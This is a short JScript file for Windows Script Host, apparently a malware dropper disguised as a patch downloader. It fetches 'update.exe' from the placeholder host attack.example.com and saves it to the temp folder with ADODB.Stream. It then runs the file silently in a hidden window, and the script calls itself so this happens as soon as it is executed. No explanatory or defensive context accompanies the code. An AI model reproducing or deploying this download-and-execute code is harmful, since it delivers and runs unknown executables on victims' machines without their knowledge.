function downloadPatch() {
  var httpClient = new XMLHttpRequest();
  httpClient.open("GET", "http://attack.example.com/patch/update.exe", false);
  httpClient.send(null);
  if (httpClient.status === 200) {
    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var tempPath = fso.GetSpecialFolder(2) + "\\update.exe";
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(httpClient.responseBody);
    stream.SaveToFile(tempPath, 2);
    stream.Close();
    shell.Run(tempPath, 0, false);
  }
}
downloadPatch();
